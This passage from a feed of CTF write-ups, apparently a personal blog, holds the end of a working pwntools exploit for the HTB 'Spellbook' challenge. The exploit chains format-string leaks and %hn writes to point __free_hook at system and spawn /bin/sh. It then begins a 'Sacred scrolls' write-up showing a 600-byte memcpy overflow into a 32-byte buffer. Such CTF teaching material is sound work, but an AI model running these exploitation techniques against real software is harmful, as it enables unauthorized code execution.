&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(entry)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;read_spell&lt;/span&gt;(io, entry):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(entry)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_spell&lt;/span&gt;(io, entry, payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    add_spell(io, entry, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; read_spell(io, entry)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete_spell&lt;/span&gt;(io, entry):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt;&amp;gt; &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: &amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(str(entry)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_low_bytes&lt;/span&gt;(addr):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(binname)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# io = remote(&amp;#39;161.35.173.232&amp;#39;, 31962)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc_main_leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%13$p&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_main_leak &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__libc_start_main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc leak:&amp;#39;&lt;/span&gt;, hex(libc_main_leak &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;240&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc base:&amp;#39;&lt;/span&gt;, hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ret_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%8$p&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lolo_libc_start_main_address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (ret_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ret addr  :&amp;#39;&lt;/span&gt;, hex(ret_addr))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;free_hook &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__free_hook
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;free hook:&amp;#39;&lt;/span&gt;, hex(free_hook))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lolo_free_hook &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; free_hook &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hilo_free_hook &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (free_hook &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff0000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;lolo_libc_start_main_address &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x%15$hn&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hilo_free_hook&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x%41$hn&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;lolo_libc_start_main_address&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x%15$hn&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;lolo_free_hook&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x%41$hn&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;leak addr:&amp;#39;&lt;/span&gt;, hex(int(get_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%13$p&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    delete_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;entry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    mask &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    mask &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    system_sub_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (system_addr &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; mask) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;system_sub_addr&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x%13$hn&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    get_spell(io, entry, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;lolo_free_hook &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x%41$hn&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    get_spell(io, entry &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    entry &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;delete_spell(io, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/spellbook_getflag.png&#34; alt=&#34;getflag&#34;&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Sacred scrolls - [HTB University CTF 2022]</title>
      <link>https://alagroy-42.github.io/writeups/sacred_scrolls/</link>
      <pubDate>Tue, 06 Dec 2022 13:24:27 +0100</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/sacred_scrolls/</guid>
      <description>The Challenge In this challenge, we have a binary named sacred_scrolls with a libc.so in a folder named glibc. The binary has the following protections :
Great ! We have some good news here. The binary is not a PIE (Position Independent Execution) which means that it will always be mapped at the same address. The other good news is that there is no stack canary on this binary so if we manage to find a buffer overflow somewhere, it shouldn&amp;rsquo;t be hard to exploit.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;In this challenge, we have a binary named &lt;code&gt;sacred_scrolls&lt;/code&gt; with a &lt;code&gt;libc.so&lt;/code&gt; in a folder named &lt;code&gt;glibc&lt;/code&gt;. The binary has the following protections :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/sacred_scrolls_protections.png&#34; alt=&#34;prot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Great ! We have some good news here. The binary is not a PIE (Position Independent Execution) which means that it will always be mapped at the same address. The other good news is that there is no stack canary on this binary so if we manage to find a buffer overflow somewhere, it shouldn&amp;rsquo;t be hard to exploit.
Let&amp;rsquo;s move to the binary now. When launched, we are ask for a wizard tag and then we get this menu :&lt;/p&gt;
&lt;p&gt;After making some random choices to get some insights about how the binary works, there are two noticeable things :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;when we leave even if we didn&amp;rsquo;t do a thing, we get a segfault.&lt;/li&gt;
&lt;li&gt;when we read a spell with a random input, we get an error that looks like the error output of the &lt;code&gt;unzip&lt;/code&gt; command&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;segvsacred_scrolls_segfaultpng&#34;&gt;&lt;img src=&#34;https://alagroy-42.github.io/sacred_scrolls_segfault.png&#34; alt=&#34;segv&#34;&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/sacred_scrolls_zip_output.png&#34; alt=&#34;zip&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now, let&amp;rsquo;s load the binary in Ghidra to get some more details. Let&amp;rsquo;s investigate first the segfault by looking at what happens when we leave. We can see that the menu is called in an infinite loop that uses &lt;code&gt;break&lt;/code&gt; when we choose &lt;em&gt;3&lt;/em&gt; as a choice. After that, the function &lt;code&gt;spell_save&lt;/code&gt; is called before the end of the &lt;code&gt;main&lt;/code&gt; with a &lt;code&gt;char buf[96]&lt;/code&gt; as an argument. Here is the output of the decompiled function :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;spell_save&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buffer)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  memcpy(buf,buffer,&lt;span style=&#34;color:#ae81ff&#34;&gt;600&lt;/span&gt;);
